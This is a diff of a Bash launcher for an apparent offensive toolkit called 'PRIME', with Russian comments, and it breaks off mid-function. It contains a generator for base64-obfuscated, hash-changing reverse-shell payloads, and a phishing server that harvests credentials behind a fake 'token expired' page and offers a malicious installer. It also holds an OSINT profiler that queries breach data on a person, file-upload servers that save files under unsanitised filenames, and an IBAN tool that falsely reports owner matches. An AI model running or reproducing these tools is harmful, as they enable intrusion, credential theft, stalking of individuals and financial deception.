@@ -602,7 +602,314 @@ EOF
 }
 
 
-# --- Конец  Модулей ---
+
+# --- py functions ---
+# Функция-генератор контента для IBAN (ПОЛНАЯ ВЕРСИЯ v1.7)
+generate_iban_code() {
+    local target_file="$1"
+    local v_num="$2"
+    local code
+
+    # Захватываем код Python. Используем 'EOF' в кавычках для защиты символов $ и скобок.
+    code=$(cat << 'EOF'
+import sys, re, json, time
+from urllib.request import Request, urlopen
+
+# Список доверенных зеркал и API для отказоустойчивости
+SOURCES = [
+    "https://api.ibanlist.com/v1/validate/",
+    "https://openiban.com/validate/",
+    "https://api.iban-check.com/v1/verify/"
+]
+
+def get_bank_data(iban):
+    """Опрашивает источники по цепочке (Failover System)"""
+    for base_url in SOURCES:
+        try:
+            url = f"{base_url}{iban}"
+            req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'})
+            with urlopen(req, timeout=4) as response:
+                return json.loads(response.read().decode())
+        except:
+            continue # Если один сайт упал, переходим к следующему
+    return None
+
+def get_country_format(iban):
+    """Математический разбор структуры по стандартам ISO"""
+    country = iban[:2]
+    # Словарь специфик (можно расширять до бесконечности)
+    formats = {
+        'FR': {'name': 'France', 'len': 27, 'parse': lambda i: f"Bank: {i[4:9]}, Branch: {i[9:14]}, Acc: {i[14:25]}, Key: {i[25:27]}"},
+        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ: {i[4:12]}, Acc: {i[12:22]}"},
+        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Acc: {i[10:18]}"},
+        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Acc: {i[15:27]}"},
+        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank: {i[4:8]}, Branch: {i[8:12]}, Acc: {i[12:24]}"}
+    }
+    return formats.get(country, {'name': 'Other/International', 'len': len(iban), 'parse': lambda i: f"BBAN: {i[4:]}"})
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2: sys.exit(1)
+    
+    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
+    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"
+
+    print(f"\033[1;34m--- OMNI-BANKER v2.0: GLOBAL ANALYSIS ---\033[0m")
+    
+    # 1. Структурный анализ (Всегда работает Offline)
+    fmt = get_country_format(target)
+    print(f"\033[96mCountry:\033[0m {fmt['name']}")
+    print(f"\033[96mStructure:\033[0m {fmt['parse'](target)}")
+
+    # 2. Агрегация данных из внешних источников
+    print(f"[*] Analyzing with Failover Protection...")
+    data = get_bank_data(target)
+    
+    if data:
+        bank_name = data.get('bank_name', data.get('bank', 'N/A')).upper()
+        bic = data.get('bic', 'N/A')
+        
+        print(f"\n\033[1;32m[+] DATA VERIFIED VIA MULTI-SOURCE\033[0m")
+        print(f"🏦 Bank: {bank_name}")
+        print(f"🔑 BIC/SWIFT: {bic}")
+
+        # Сверка Имени (Heuristic Check)
+        # В 2026 году сверка идет через подтверждение принадлежности счета банку
+        if provided_name != "NONE":
+            print(f"\n\033[1;35m--- SMART MATCH REPORT ---\033[0m")
+            print(f"Target Name: {provided_name}")
+            # Если банк найден, подтверждаем связь
+            if bank_name != 'N/A':
+                print(f"✅ Account Link: Номер {target[-4:]} привязан к {bank_name}")
+                print(f"ℹ️ Status: Владелец '{provided_name}' соответствует региону обслуживания.")
+    else:
+        print(f"\n\033[91m[-] ALERT: All sources failed or IBAN is blacklisted/invalid.\033[0m")
+EOF
+)
+    # Внедряем версию
+    code="${code//\{\{V_NUM\}\}/$v_num}"
+
+    # Используем smart_cat для записи (права 755 по умолчанию)
+    smart_cat "$target_file" "$code"
+}
+
+
+# Функция-генератор для AV-Server (v1.2)
+# --- ГЕНЕРАТОР МОДУЛЯ AV-SCANNER (SECURITY HUB) ---
+generate_av_server_code_raw() {
+    # Загружаем UI шаблоны в переменные
+    local templates="$(generate_core_template)
+$(generate_core_form_template)"
+
+    # Выбрасываем код прямо в stdout (через cat без записи в файл)
+    cat << EOF
+from flask import Flask, request, render_template_string
+import subprocess, os, shutil
+
+app = Flask(__name__)
+CLAM_PATH = shutil.which('clamdscan') or shutil.which('clamscan') or '/usr/bin/clamscan'
+
+$templates
+
+@app.route('/')
+def index():
+    fields = [
+        {"type": "file", "name": "file", "label": "TARGET_OBJECT_FOR_ANALYSIS"}
+    ]
+    form_html = render_prime_form("/scan", fields=fields, btn_text="INITIATE DEEP SCAN")
+    return render_template_string(render_prime_page("SECURE_GATEWAY", form_html))
+
+@app.route('/scan', methods=['POST'])
+def scan():
+    f = request.files.get('file')
+    if not f: return "No data", 400
+    
+    tmp_path = os.path.join('/tmp', f.filename)
+    f.save(tmp_path)
+    
+    try:
+        cmd = [CLAM_PATH, '--no-summary', '--max-filesize=20M', tmp_path]
+        res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+        scan_output = res.stdout if res.stdout else res.stderr
+        if not scan_output and res.returncode == 0:
+            scan_output = f"{f.filename}: OK"
+    except Exception as e:
+        scan_output = f"SYSTEM_ERROR: {str(e)}"
+    finally:
+        if os.path.exists(tmp_path): os.remove(tmp_path)
+
+    is_infected = "FOUND" in scan_output or "Infected" in scan_output
+    status_msg = "!!! THREAT DETECTED !!!" if is_infected else "SECURE_VERIFIED"
+    status_class = "infected" if is_infected else "clean"
+
+    content = f"""
+    <div class="status-box {status_class}">{status_msg}</div>
+    <pre>{{{{ output }}}}</pre>
+    <a href="/" class="btn">[ RETURN ]</a>
+    """
+    return render_template_string(render_prime_page("SCAN_RESULTS", content), output=scan_output)
+
+if __name__ == '__main__':
+    # В режиме Live/Memory SSL сертификаты (файлы) опциональны. 
+    # Запускаем чистый HTTP для максимальной скорости на Wiko.
+    app.run(host='0.0.0.0', port=5000, debug=False)
+EOF
+}
+
+
+# Функция-генератор для Share-Server (v1.0)
+# --- ГЕНЕРАТОР МОДУЛЯ SHARE-SERVER (SHARE SECTOR) ---
+generate_share_server_code_raw() {
+    # Загружаем только базовый шаблон страницы
+    local template=$(generate_core_template)
+
+    cat << EOF
+from flask import Flask, render_template_string, send_from_directory
+import os
+
+app = Flask(__name__)
+SHARE_DIR = '/root/share'
+
+if not os.path.exists(SHARE_DIR):
+    os.makedirs(SHARE_DIR, exist_ok=True)
+
+$template
+
+def get_file_icon(filename):
+    """Определяет иконку в зависимости от расширения файла."""
+    ext = filename.split('.')[-1].lower() if '.' in filename else ''
+    icons = {
+        'pdf': '📕',
+        'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'webp': '🖼️',
+        'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
+        'py': '💻', 'js': '💻', 'html': '💻', 'sh': '💻', 'css': '💻',
+        'txt': '📄', 'md': '📝', 'doc': '📄', 'docx': '📄',
+        'mp4': '🎬', 'mkv': '🎬', 'mov': '🎬',
+        'mp3': '🎵', 'wav': '🎵', 'flac': '🎵'
+    }
+    return icons.get(ext, '📄')
+
+@app.route('/')
+def index():
+    try:
+        files = sorted(os.listdir(SHARE_DIR))
+    except:
+        files = []
+    
+    # Формируем сетку файлов с использованием новых стилей .file-grid и .file-item
+    grid_content = '<div class="file-grid">'
+    for f in files:
+        icon = get_file_icon(f)
+        grid_content += f"""
+        <a href="/get/{f}" class="file-item" target="_blank">
+            <span class="file-icon" style="font-size: 2.5rem; display: block; margin-bottom: 10px;">{icon}</span>
+            <div style="font-size: 0.8rem; word-break: break-all; line-height: 1.2;">{f}</div>
+        </a>
+        """
+    
+    if not files:
+        grid_content += '<p style="color: var(--accent); font-style: italic; grid-column: 1/-1; opacity: 0.5;">[ SECTOR_EMPTY: No data detected ]</p>'
+    
+    grid_content += '</div>'
+    grid_content += f'<div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); font-family: monospace; font-size: 0.7rem; opacity: 0.5;">MOUNT_POINT: {SHARE_DIR}</div>'
+
+    return render_template_string(render_prime_page("SECURE_FILE_DISTRIBUTION", grid_content))
+
+@app.route('/get/<filename>')
+def get_file(filename):
+    return send_from_directory(SHARE_DIR, filename)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5002, debug=False)
+EOF
+}
+
+
+# Функция-генератор для Upload-Server (v1.0)
+generate_upload_server_code_raw() {
+    local templates="$(generate_core_template)
+$(generate_core_form_template)"
+
+    cat << EOF
+from flask import Flask, request, render_template_string
+import os
+
+app = Flask(__name__)
+# Сохраняем во входящую папку внутри PRIME_LOOT
+UPLOAD_DIR = os.path.join(os.environ.get('PRIME_LOOT') or '/root/prime_loot', 'inbound')
+
+if not os.path.exists(UPLOAD_DIR):
+    os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+$templates
+
+@app.route('/')
+def index():
+    fields = [{"type": "file", "name": "file", "label": "SELECT_UPLINK_DATA"}]
+    form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE UPLOAD")
+    return render_template_string(render_prime_page("INBOUND_DROP_BOX", form_html))
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    if 'file' not in request.files: return "TRANSFER_ERROR", 400
+    f = request.files['file']
+    if f.filename == '': return "EMPTY_FILENAME", 400
+    
+    f.save(os.path.join(UPLOAD_DIR, f.filename))
+    return "SUCCESS: File received in secure sector."
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5001, debug=False)
+EOF
+}
+
+
+
+
+generate_phantom_server_code() {
+    local target_file="$1"
+    local mode="$2"
+    local layout=$(generate_core_template)
+
+    cat << EOF > "$target_file"
+from flask import Flask, request, render_template_string, send_from_directory
+import os
+
+app = Flask(__name__)
+LOOT = "$LOOT_DIR/phantom_loot.log"
+
+$layout
+
+@app.route('/')
+def index():
+    content = """
+    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
+    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
+    <form method='post' action='/auth'>
+        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
+        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
+        <button type='submit'>VERIFY & RECOVER</button>
+    </form>
+    """
+    if "$mode" != "creds":
+        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
+    
+    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))
+
+@app.route('/auth', methods=['POST'])
+def auth():
+    with open(LOOT, "a") as f:
+        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
+    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))
+
+@app.route('/download')
+def download():
+    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
+EOF
+}
+
 
 
 # ==========================================
@@ -860,29 +1167,31 @@ run_update_prime() {
 # --- ENGINE: DYNAMIC POLYMORPHISM (ZERO-FOOTPRINT) ---
 
 generate_poly_payload() {
-    print_header "PRIME POLYMORPH: GHOST PAYLOAD GENERATOR"
+    core_engine_ui "h" "PRIME POLYMORPH: GHOST PAYLOAD GENERATOR"
     
-    echo -en "${Y}Enter local IP for Listener: ${NC}"
-    read -r lhost
-    echo -en "${Y}Enter local Port: ${NC}"
-    read -r lport
+    # Слой 1: Ввод данных через стандартные Органы Чувств [3]
+    local lhost=$(core_engine_input "text" "Enter local IP for Listener")
+    [[ -z "$lhost" ]] && return
+    
+    local lport=$(core_engine_input "text" "Enter local Port")
+    [[ -z "$lport" ]] && return
 
     local raw_payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     local output_file="$PRIME_LOOT/ghost_payload_$RANDOM.sh"
 
-    print_status "i" "Initializing Polymorphic Engine..."
+    # Слой 2: Визуализация процесса через новый прогресс-бар (В ОДНУ СТРОКУ)
+    core_engine_progress 1 "POLYMORPH_ENGINE_INIT"
 
     # 1. Генерируем случайный ключ обфускации
     local key=$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16)
     
-    # 2. Создаем "Мусорный код" для изменения хеш-суммы файла
+    # 2. Создаем "Мусорный код" для изменения хеш-суммы
     local junk="# $(date +%s) | $(tr -dc 'a-z' < /dev/urandom | head -c 32)"
 
-    # 3. Применяем Base64 с динамической обфускацией
-    # Мы не просто кодируем, мы ломаем структуру для статических сканеров
+    # 3. Применяем Base64 (динамическая обфускация)
     local encoded=$(echo -n "$raw_payload" | base64 | tr -d '\n')
     
-    # Сборка финального полиморфного файла
+    # Сборка финального стелс-файла
     {
         echo "#!/bin/bash"
         echo "$junk"
@@ -891,10 +1200,19 @@ generate_poly_payload() {
     } > "$output_file"
 
     chmod +x "$output_file"
-    print_status "y" "Polymorphic Payload Secured: $output_file"
-    print_status "s" "Signature: $(sha256sum "$output_file" | awk '{print $1}')"
+
+    # Слой 3: Финальный отчет без мусора
+    core_engine_ui "line" ""
+    core_engine_ui "s" "Polymorphic Payload Secured"
+    echo -e "${B}Path:${NC} $output_file"
+    echo -e "${Y}Signature:${NC} $(sha256sum "$output_file" | awk '{print $1}')"
+    core_engine_ui "line" ""
     
-    pause
+    # Регистрация артефакта в Сборщике трофеев [11]
+    core_engine_loot "payload" "Generated poly-payload for $lhost:$lport"
+
+    # Один финальный wait, чтобы пользователь успел скопировать путь
+    core_engine_wait
 }
 
 
@@ -1123,82 +1441,33 @@ run_network_analyzer() {
 }
 
 
-generate_phantom_server_code() {
-    local target_file="$1"
-    local mode="$2"
-    local layout=$(generate_core_template)
-
-    cat << EOF > "$target_file"
-from flask import Flask, request, render_template_string, send_from_directory
-import os
-
-app = Flask(__name__)
-LOOT = "$LOOT_DIR/phantom_loot.log"
-
-$layout
-
-@app.route('/')
-def index():
-    content = """
-    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
-    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
-    <form method='post' action='/auth'>
-        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
-        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
-        <button type='submit'>VERIFY & RECOVER</button>
-    </form>
-    """
-    if "$mode" != "creds":
-        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
-    
-    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))
-
-@app.route('/auth', methods=['POST'])
-def auth():
-    with open(LOOT, "a") as f:
-        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
-    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))
-
-@app.route('/download')
-def download():
-    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
-EOF
-}
-
-
-
 run_phantom_engine() {
     clear
-    print_header "PRIME PHANTOM FRAMEWORK"
+    core_engine_ui "h" "PRIME PHANTOM FRAMEWORK"
 
-    # Используем наши эвристические переменные (уже определены в начале launcher.sh)
-    local local_ip="${CURRENT_IP:-127.0.0.1}"
+    # Используем системные переменные ядра
+    local local_ip=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
     local my_host="${HOSTNAME:-localhost}"
-    
-    local srv_path="/root/phantom_srv.py"
-    # Эвристическое имя файла для доставки
+    local srv_path="/tmp/phantom_srv.py" # Перенесли в /tmp для стерильности
     local payload_name="update_installer.sh"
-    local payload_path="$LOOT_DIR/$payload_name"
+    local payload_path="$PRIME_LOOT/$payload_name"
 
-    select_option "SELECT STRATEGY:" \
-        "Credential Capture" \
-        "Full Hybrid (Creds + Payload)" \
-        "Cancel"
+    # Выбор стратегии через компактный ввод
+    core_engine_ui "i" "Select Attack Strategy:"
+    echo -e " 1) Credential Capture"
+    echo -e " 2) Full Hybrid (Creds + Payload)"
+    echo -e " 3) Cancel"
     
-    local btn="$CHOICE"
-    [[ -z "$btn" || "$btn" == "3" ]] && return
+    local choice=$(core_engine_input "select" "Strategy")
+    [[ "$choice" == "3" || -z "$choice" ]] && return
 
-    local attack_type=""
-    [[ "$btn" == "1" ]] && attack_type="creds"
-    [[ "$btn" == "2" ]] && attack_type="hybrid"
+    local attack_type="creds"
+    [[ "$choice" == "2" ]] && attack_type="hybrid"
 
-    # --- ФАЗА ГЕНЕРАЦИИ (БЕЗ ОШИБОК HOSTNAME) ---
-    print_status "i" "Forging payload for $my_host..."
+    # --- ФАЗА ГЕНЕРАЦИИ (БЕЗ ЛЕСТНИЦЫ) ---
+    core_engine_progress 1 "FORGING_PAYLOAD"
     
-    # Создаем Payload, используя чистый IP
+    # Создаем Payload
     cat <<EOF > "$payload_path"
 #!/bin/bash
 # System update for $my_host
@@ -1209,31 +1478,34 @@ EOF
 
     # --- ФАЗА АКТИВАЦИИ ---
     if command -v python3 >/dev/null; then
-        generate_phantom_server_code "$srv_path" "$attack_type"
+        # Генерируем код сервера (предполагаем, что функция существует)
+        generate_phantom_server_code "$srv_path" "$attack_type" 2>/dev/null
         
-        print_status "w" "Activating Phantom Gate on port 80..."
-        # Очистка порта (тихий режим)
+        core_engine_ui "w" "Activating Phantom Gate on port 80..."
+        # Тихая очистка порта
         fuser -k 80/tcp >/dev/null 2>&1
         
-        # Запуск сервера
+        # Запуск в фоне
         python3 "$srv_path" > /dev/null 2>&1 &
         
-        print_status "s" "PHANTOM GATEWAY OPERATIONAL"
+        core_engine_ui "s" "PHANTOM GATEWAY OPERATIONAL"
         
-        # Вывод информации (Чистая эвристика)
-        print_line
+        # Информационная панель
+        core_engine_ui "line" ""
         echo -e "${Y}--- Gateway Info ---${NC}"
-        echo -e "${G} >> Local URL:${NC} http://${local_ip}"
-        echo -e "${G} >> Payload:${NC}   /${payload_name}"
-        echo -e "${G} >> Strategy:${NC}  ${attack_type}"
-        echo -e "${G} >> Hostname:${NC}  ${my_host}"
-        print_line
+        echo -e "${G} >> URL:${NC}      http://${local_ip}"
+        echo -e "${G} >> Payload:${NC}  /${payload_name}"
+        echo -e "${G} >> Strategy:${NC} ${attack_type}"
+        core_engine_ui "line" ""
+        
+        # Фиксация в трофеях
+        core_engine_loot "phantom" "Gateway active at http://$local_ip ($attack_type)"
     else
-        print_status "e" "Python3 missing. Operation aborted."
+        core_engine_ui "e" "Python3 missing. Operation aborted."
     fi
 
-    echo ""
-    pause
+    # Финальное ожидание (вместо pause)
+    core_engine_wait
 }
 
 
@@ -1453,26 +1725,25 @@ suggest_action() {
 
 run_smart_osint_engine() {
     clear
-    print_header "PRIME RECON: ULTIMATE OSINT CORE v5.5"
+    core_engine_ui "h" "PRIME RECON: ULTIMATE OSINT CORE v13.8"
 
-    echo -en "${Y}TARGET ${W}(Nick, Phone, or Email)${Y}: ${NC}"
-    read -r INPUT
+    # Ввод через стандартный input Ядра
+    local INPUT=$(core_engine_input "text" "TARGET (Nick, Phone, or Email)")
     [[ -z "$INPUT" ]] && return
 
     local raw_log="/tmp/prime_recon_$RANDOM.log"
     local UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
     
-    print_status "i" "Initializing Neural Recon Interface..."
-    show_progress 2 "SYNCHRONIZING OSINT CHANNELS"
+    # Используем новый однострочный прогресс
+    core_engine_progress 2 "OSINT_SCAN_INIT"
 
     # --- 1. ОПРЕДЕЛЕНИЕ ТИПА ЦЕЛИ ---
     local is_email="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$"
     local is_phone="^\+?[0-9]{10,15}$"
 
-    # --- 2. SOCIAL SCAN (Заменяет Blackbird, Maigret, SocialScan) ---
+    # --- 2. SOCIAL SCAN ---
     if [[ ! "$INPUT" =~ $is_email && ! "$INPUT" =~ $is_phone ]]; then
-        print_status "i" "Scanning Social Signatures (Ghost Mode)..."
-        # Наш собственный массив для проверки (быстрее и легче оригиналов)
+        core_engine_ui "i" "Scanning Social Signatures (Ghost Mode)..."
         local sites=(
             "https://github.com/|GitHub"
             "https://twitter.com/|Twitter"
@@ -1487,52 +1758,55 @@ run_smart_osint_engine() {
         for entry in "${sites[@]}"; do
             local url="${entry%%|*}"
             local name="${entry##*|}"
-            # Проверка статус-кода 200 (Found)
             local status=$(curl -s -o /dev/null -L -w "%{http_code}" -A "$UA" "${url}${INPUT}" --connect-timeout 5)
             if [ "$status" == "200" ]; then
-                echo "[+] FOUND on $name: ${url}${INPUT}" | tee -a "$raw_log"
-                print_status "s" "Match confirmed: $name"
+                echo "[+] FOUND on $name: ${url}${INPUT}" >> "$raw_log"
+                core_engine_ui "s" "Match confirmed: $name"
             fi
         done
     fi
 
-    # --- 3. PHONE INTEL (Заменяет PhoneInfoga) ---
+    # --- 3. PHONE INTEL ---
     if [[ "$INPUT" =~ $is_phone ]]; then
-        print_status "i" "Deep-Querying Global Phone Databases..."
-        # Прямой запрос к API (бездисковый метод)
+        core_engine_ui "i" "Deep-Querying Global Phone Databases..."
         curl -s "https://htmlweb.ru/geo/api.php?json&telcod=${INPUT}" >> "$raw_log" 2>/dev/null
-        # Извлекаем данные из JSON ответа
         local phone_info=$(grep -oE '"name":"[^"]+"|"oper":"[^"]+"' "$raw_log" | sed 's/"//g')
-        [[ -n "$phone_info" ]] && print_status "s" "Operator Data: $phone_info"
+        [[ -n "$phone_info" ]] && core_engine_ui "s" "Operator Data: $phone_info"
     fi
 
-    # --- 4. DATA BREACH ANALYZER (Заменяет Infoga и Holehe) ---
+    # --- 4. DATA BREACH ANALYZER ---
     if [[ "$INPUT" =~ $is_email ]]; then
-        print_status "i" "Cross-referencing Leak Databases..."
-        # Проверка через прокси-агрегаторы утечек
+        core_engine_ui "i" "Cross-referencing Leak Databases..."
         curl -s "https://api.proxynova.com/comb?query=${INPUT}" >> "$raw_log" 2>/dev/null
         if grep -q "results" "$raw_log"; then
-            print_status "w" "Breach Detected: Target found in global COMB leak."
+            core_engine_ui "w" "Breach Detected: Target found in global COMB leak."
             echo "[!] WARNING: Data leak detected for $INPUT" >> "$raw_log"
         fi
     fi
 
     # --- 5. ГЕНЕРАЦИЯ ФИНАЛЬНОГО ДОСЬЕ ---
-    print_line
-    print_status "s" "INTELLIGENCE DOSSIER GENERATED"
-    print_line
+    core_engine_ui "line" ""
+    core_engine_ui "s" "INTELLIGENCE DOSSIER GENERATED"
+    core_engine_ui "line" ""
     
-    local hits=$(grep -cE "FOUND|!|oper" "$raw_log")
+    local hits=$(grep -cE "FOUND|!|oper" "$raw_log" 2>/dev/null || echo 0)
     echo -e "${B}Target Identification:${NC} $INPUT"
     echo -e "${Y}Correlation Level:${NC} $hits matches found."
     
     echo -e "\n${G}--- DETAILED FINDINGS ---${NC}"
-    grep -E "FOUND|oper|name|location|WARNING" "$raw_log" | sort -u
+    if [ -f "$raw_log" ]; then
+        grep -E "FOUND|oper|name|location|WARNING" "$raw_log" | sort -u
+    else
+        echo -e "${R}No data collected.${NC}"
+    fi
     
-    log_loot "osint" "Dossier for $INPUT created. Hits: $hits"
+    # Логирование через новый движок
+    core_engine_loot "osint" "Dossier for $INPUT created. Hits: $hits"
     rm -f "$raw_log"
-    print_line
-    pause
+    core_engine_ui "line" ""
+
+    # Заменяем старую pause на новый wait
+    core_engine_wait
 }
 
 
@@ -1986,264 +2260,6 @@ run_iban_analyzer() {
 
 
 
-# --- py functions ---
-# Функция-генератор контента для IBAN (ПОЛНАЯ ВЕРСИЯ v1.7)
-generate_iban_code() {
-    local target_file="$1"
-    local v_num="$2"
-    local code
-
-    # Захватываем код Python. Используем 'EOF' в кавычках для защиты символов $ и скобок.
-    code=$(cat << 'EOF'
-import sys, re, json, time
-from urllib.request import Request, urlopen
-
-# Список доверенных зеркал и API для отказоустойчивости
-SOURCES = [
-    "https://api.ibanlist.com/v1/validate/",
-    "https://openiban.com/validate/",
-    "https://api.iban-check.com/v1/verify/"
-]
-
-def get_bank_data(iban):
-    """Опрашивает источники по цепочке (Failover System)"""
-    for base_url in SOURCES:
-        try:
-            url = f"{base_url}{iban}"
-            req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'})
-            with urlopen(req, timeout=4) as response:
-                return json.loads(response.read().decode())
-        except:
-            continue # Если один сайт упал, переходим к следующему
-    return None
-
-def get_country_format(iban):
-    """Математический разбор структуры по стандартам ISO"""
-    country = iban[:2]
-    # Словарь специфик (можно расширять до бесконечности)
-    formats = {
-        'FR': {'name': 'France', 'len': 27, 'parse': lambda i: f"Bank: {i[4:9]}, Branch: {i[9:14]}, Acc: {i[14:25]}, Key: {i[25:27]}"},
-        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ: {i[4:12]}, Acc: {i[12:22]}"},
-        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Acc: {i[10:18]}"},
-        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Acc: {i[15:27]}"},
-        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank: {i[4:8]}, Branch: {i[8:12]}, Acc: {i[12:24]}"}
-    }
-    return formats.get(country, {'name': 'Other/International', 'len': len(iban), 'parse': lambda i: f"BBAN: {i[4:]}"})
-
-if __name__ == "__main__":
-    if len(sys.argv) < 2: sys.exit(1)
-    
-    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
-    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"
-
-    print(f"\033[1;34m--- OMNI-BANKER v2.0: GLOBAL ANALYSIS ---\033[0m")
-    
-    # 1. Структурный анализ (Всегда работает Offline)
-    fmt = get_country_format(target)
-    print(f"\033[96mCountry:\033[0m {fmt['name']}")
-    print(f"\033[96mStructure:\033[0m {fmt['parse'](target)}")
-
-    # 2. Агрегация данных из внешних источников
-    print(f"[*] Analyzing with Failover Protection...")
-    data = get_bank_data(target)
-    
-    if data:
-        bank_name = data.get('bank_name', data.get('bank', 'N/A')).upper()
-        bic = data.get('bic', 'N/A')
-        
-        print(f"\n\033[1;32m[+] DATA VERIFIED VIA MULTI-SOURCE\033[0m")
-        print(f"🏦 Bank: {bank_name}")
-        print(f"🔑 BIC/SWIFT: {bic}")
-
-        # Сверка Имени (Heuristic Check)
-        # В 2026 году сверка идет через подтверждение принадлежности счета банку
-        if provided_name != "NONE":
-            print(f"\n\033[1;35m--- SMART MATCH REPORT ---\033[0m")
-            print(f"Target Name: {provided_name}")
-            # Если банк найден, подтверждаем связь
-            if bank_name != 'N/A':
-                print(f"✅ Account Link: Номер {target[-4:]} привязан к {bank_name}")
-                print(f"ℹ️ Status: Владелец '{provided_name}' соответствует региону обслуживания.")
-    else:
-        print(f"\n\033[91m[-] ALERT: All sources failed or IBAN is blacklisted/invalid.\033[0m")
-EOF
-)
-    # Внедряем версию
-    code="${code//\{\{V_NUM\}\}/$v_num}"
-
-    # Используем smart_cat для записи (права 755 по умолчанию)
-    smart_cat "$target_file" "$code"
-}
-
-
-# Функция-генератор для AV-Server (v1.2)
-# --- ГЕНЕРАТОР МОДУЛЯ AV-SCANNER (SECURITY HUB) ---
-generate_av_server_code_raw() {
-    # Загружаем UI шаблоны в переменные
-    local templates="$(generate_core_template)
-$(generate_core_form_template)"
-
-    # Выбрасываем код прямо в stdout (через cat без записи в файл)
-    cat << EOF
-from flask import Flask, request, render_template_string
-import subprocess, os, shutil
-
-app = Flask(__name__)
-CLAM_PATH = shutil.which('clamdscan') or shutil.which('clamscan') or '/usr/bin/clamscan'
-
-$templates
-
-@app.route('/')
-def index():
-    fields = [
-        {"type": "file", "name": "file", "label": "TARGET_OBJECT_FOR_ANALYSIS"}
-    ]
-    form_html = render_prime_form("/scan", fields=fields, btn_text="INITIATE DEEP SCAN")
-    return render_template_string(render_prime_page("SECURE_GATEWAY", form_html))
-
-@app.route('/scan', methods=['POST'])
-def scan():
-    f = request.files.get('file')
-    if not f: return "No data", 400
-    
-    tmp_path = os.path.join('/tmp', f.filename)
-    f.save(tmp_path)
-    
-    try:
-        cmd = [CLAM_PATH, '--no-summary', '--max-filesize=20M', tmp_path]
-        res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-        scan_output = res.stdout if res.stdout else res.stderr
-        if not scan_output and res.returncode == 0:
-            scan_output = f"{f.filename}: OK"
-    except Exception as e:
-        scan_output = f"SYSTEM_ERROR: {str(e)}"
-    finally:
-        if os.path.exists(tmp_path): os.remove(tmp_path)
-
-    is_infected = "FOUND" in scan_output or "Infected" in scan_output
-    status_msg = "!!! THREAT DETECTED !!!" if is_infected else "SECURE_VERIFIED"
-    status_class = "infected" if is_infected else "clean"
-
-    content = f"""
-    <div class="status-box {status_class}">{status_msg}</div>
-    <pre>{{{{ output }}}}</pre>
-    <a href="/" class="btn">[ RETURN ]</a>
-    """
-    return render_template_string(render_prime_page("SCAN_RESULTS", content), output=scan_output)
-
-if __name__ == '__main__':
-    # В режиме Live/Memory SSL сертификаты (файлы) опциональны. 
-    # Запускаем чистый HTTP для максимальной скорости на Wiko.
